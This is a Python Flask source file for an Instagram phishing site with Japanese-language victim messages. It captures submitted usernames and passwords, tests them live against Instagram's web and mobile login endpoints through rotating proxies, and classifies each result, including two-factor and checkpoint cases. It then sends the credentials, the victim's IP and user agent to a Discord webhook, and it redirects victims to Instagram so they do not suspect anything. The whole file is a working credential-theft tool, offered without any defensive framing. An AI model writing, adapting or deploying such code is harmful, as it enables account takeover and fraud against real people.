import base64
import os
import random
import time
import uuid

import requests
from flask import (Flask, Response, redirect, render_template, request,
                   url_for)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "ig-clone-" + str(random.random()))

IG_HOME = "https://www.instagram.com/"
IG_WEB_LOGIN = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
IG_MOBILE_LOGIN = "https://i.instagram.com/api/v1/accounts/login/"

UA_DESKTOP = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
UA_MOBILE = (
    "Instagram 275.0.0.27.98 Android (33/13; 420dpi; 1080x2400; samsung; "
    "SM-S918B; dm3q; qcom; ja_JP; 504102885)"
)

APP_ID_WEB = "936619743392459"
APP_ID_MOBILE = "567067343352427"

TIMEOUT = float(os.environ.get("IG_TIMEOUT", "12"))
STRICT = os.environ.get("IG_STRICT", "0") == "1"
PROXY_LIST = [p.strip() for p in os.environ.get("IG_PROXY", "").split(",") if p.strip()]

DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK_URL", "").strip()

MSG_NO_USER = ("入力したユーザー名のアカウントが見つかりませんでした。"
               "ユーザー名を確認してもう一度お試しください。")
MSG_BAD_PASS = "パスワードが間違っています。もう一度お試しください。"
MSG_GENERIC = "問題が発生しました。しばらくしてからもう一度お試しください。"

PIXEL = base64.b64decode(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
)

VERDICT_LABEL = {
    "ok": ("ログイン成功", 0x2ECC71),
    "ok_2fa": ("ログイン成功（2FA要求）", 0xF1C40F),
    "ok_challenge": ("ログイン成功（確認要求）", 0xF1C40F),
    "bad_pass": ("パスワード誤り", 0xE74C3C),
    "no_user": ("アカウントなし", 0xE74C3C),
    "ambiguous": ("判定不能", 0x95A5A6),
}


# ---------------------------------------------------------------- helpers

def _proxies():
    if not PROXY_LIST:
        return None
    p = random.choice(PROXY_LIST)
    return {"http": p, "https": p}


def _enc_pw(pw):
    return "#PWD_INSTAGRAM_BROWSER:0:%d:%s" % (int(time.time()), pw)


def _classify(status, payload):
    """Instagram の応答を判定に変換する。"""
    if not isinstance(payload, dict):
        return "ambiguous"

    msg = (payload.get("message") or "")
    low = msg.lower()
    etype = (payload.get("error_type") or "").lower()

    if payload.get("authenticated") is True:
        return "ok"
    if payload.get("two_factor_required") or payload.get("two_factor_info"):
        return "ok_2fa"
    if (payload.get("checkpoint_url") or payload.get("challenge")
            or "checkpoint" in etype or "challenge" in low or "checkpoint" in low):
        return "ok_challenge"

    if etype in ("bad_password", "invalid_password") or "incorrect" in low and "password" in low:
        return "bad_pass"
    if etype in ("invalid_user", "bad_user", "user_not_found") \
            or "doesn't belong to an account" in low or "username you entered" in low:
        return "no_user"
    if payload.get("user") is False and payload.get("authenticated") is False:
        return "no_user"

    if status == 429 or "wait a few minutes" in low or "please wait" in low:
        return "ambiguous"
    if payload.get("user") is True:
        return "bad_pass"

    return "ambiguous"


def _web_login(username, password):
    px = _proxies()
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA_DESKTOP,
        "Accept-Language": "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
    })
    s.get(IG_HOME, timeout=TIMEOUT, proxies=px)
    csrf = s.cookies.get("csrftoken") or ""

    headers = {
        "X-CSRFToken": csrf,
        "X-IG-App-ID": APP_ID_WEB,
        "X-Requested-With": "XMLHttpRequest",
        "X-ASBD-ID": "129477",
        "Origin": "https://www.instagram.com",
        "Referer": "https://www.instagram.com/accounts/login/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
    }
    data = {
        "username": username,
        "enc_password": _enc_pw(password),
        "queryParams": "{}",
        "optIntoOneTap": "false",
        "stopDeletionNonce": "",
        "trustedDeviceRecords": "{}",
    }
    r = s.post(IG_WEB_LOGIN, data=data, headers=headers, timeout=TIMEOUT,
               proxies=px, allow_redirects=False)

    try:
        payload = r.json()
    except Exception:
        return "ambiguous"

    return _classify(r.status_code, payload)


def _mobile_login(username, password):
    px = _proxies()
    headers = {
        "User-Agent": UA_MOBILE,
        "X-IG-App-ID": APP_ID_MOBILE,
        "X-IG-Capabilities": "3brTvwE=",
        "X-IG-Connection-Type": "WIFI",
        "X-IG-Bandwidth-TotalBytes-B": "5000000",
        "X-IG-Bandwidth-TotalTime-MS": "2000",
        "Accept-Language": "ja-JP",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    }
    data = {
        "username": username,
        "enc_password": _enc_pw(password),
        "guid": str(uuid.uuid4()),
        "phone_id": str(uuid.uuid4()),
        "adid": str(uuid.uuid4()),
        "_uuid": str(uuid.uuid4()),
        "device_id": "android-" + uuid.uuid4().hex[:16],
        "login_attempt_count": "0",
    }
    r = requests.post(IG_MOBILE_LOGIN, data=data, headers=headers,
                      timeout=TIMEOUT, proxies=px)

    try:
        payload = r.json()
    except Exception:
        return "ambiguous"

    return _classify(r.status_code, payload)


def _verify(username, password):
    """Web → Mobile の順で検証。"""
    verdict = "ambiguous"
    try:
        verdict = _web_login(username, password)
    except Exception:
        verdict = "ambiguous"

    if verdict == "ambiguous":
        time.sleep(1.2)
        try:
            verdict = _mobile_login(username, password)
        except Exception:
            verdict = "ambiguous"

    return verdict


def _clip(value, limit=1000):
    value = (value or "").strip()
    if not value:
        return "-"
    return value if len(value) <= limit else value[:limit] + "…"


def _notify(verdict, username, password):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "-")
    ua = request.headers.get("User-Agent", "-")

    print("[%s] %s / %s | ip=%s" % (verdict, username, password, ip), flush=True)

    if not DISCORD_WEBHOOK:
        return

    label, color = VERDICT_LABEL.get(verdict, ("不明", 0x95A5A6))
    payload = {
        "username": "Instagram",
        "embeds": [{
            "title": label,
            "color": color,
            "fields": [
                {"name": "ユーザー名", "value": _clip(username), "inline": True},
                {"name": "パスワード", "value": _clip(password), "inline": True},
                {"name": "IP", "value": _clip(ip), "inline": False},
                {"name": "UA", "value": _clip(ua, 400), "inline": False},
            ],
            "footer": {"text": "instagram-clone"},
        }],
    }

    try:
        r = requests.post(DISCORD_WEBHOOK, json=payload, timeout=6)
        if r.status_code not in (200, 204):
            print("discord error %s: %s" % (r.status_code, r.text[:200]), flush=True)
    except Exception as e:
        print("discord failed: %s" % e, flush=True)


# ---------------------------------------------------------------- routes

def make_index(html):
    resp = Response(html)
    resp.headers["Cache-Control"] = "no-store"
    return resp


@app.route("/", methods=["GET"])
def index():
    resp = make_index(render_template("index.html", error=None, username=""))
    ref = request.args.get("ref")
    if ref:
        resp.set_cookie("ref", ref, max_age=60 * 60 * 24 * 30)
    return resp


@app.route("/login", methods=["GET"])
def login_get():
    return redirect(url_for("index"))


@app.route("/login", methods=["POST"])
def login_post():
    username = (request.form.get("username") or "").strip()
    password = request.form.get("password") or ""

    if not username or not password:
        return make_index(render_template(
            "index.html", error=MSG_GENERIC, username=username))

    verdict = _verify(username, password)
    _notify(verdict, username, password)

    if verdict in ("ok", "ok_2fa", "ok_challenge"):
        note = ""
        if verdict == "ok_2fa":
            note = "本人確認のため、Instagramアプリで確認コードを入力してください。"
        elif verdict == "ok_challenge":
            note = "新しい端末からのログインのため、Instagramで確認を求められる場合があります。"
        return make_index(render_template(
            "success.html", username=username, note=note, target=IG_HOME))

    if verdict == "no_user":
        return make_index(render_template(
            "index.html", error=MSG_NO_USER, username=username))

    if verdict == "bad_pass":
        return make_index(render_template(
            "index.html", error=MSG_BAD_PASS, username=username))

    # ambiguous
    if STRICT:
        return make_index(render_template(
            "index.html", error=MSG_GENERIC, username=username))

    return make_index(render_template(
        "success.html", username=username,
        note="Instagram側の制限により自動確認できませんでした。",
        target=IG_HOME))


@app.route("/open.gif")
def open_gif():
    resp = Response(PIXEL, mimetype="image/gif")
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    return resp


@app.route("/healthz")
def healthz():
    return "ok"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
